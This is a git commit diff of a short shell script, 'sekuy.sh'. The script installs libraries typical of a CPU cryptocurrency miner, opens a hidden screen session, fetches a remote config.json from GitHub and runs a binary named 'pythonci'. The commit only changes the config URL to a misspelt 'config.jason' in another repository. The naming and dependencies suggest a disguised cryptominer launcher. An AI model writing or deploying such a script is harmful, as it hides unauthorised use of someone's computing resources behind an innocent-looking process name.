d00a52cc44c9fe5d54a20eafeb82dba47d0920ba
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-10-03 08:33:47 +0700

    Update sekuy.sh

--- sekuy.sh
+++ sekuy.sh
@@ -4,5 +4,5 @@ sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 chmod +x pythonci
 screen -dmS ls
-wget https://raw.githubusercontent.com/outbesok/mesin/main/nyampah_ah/config.json
+wget https://raw.githubusercontent.com/hendrik20212/VRS/main/config.jason
  ./pythonci
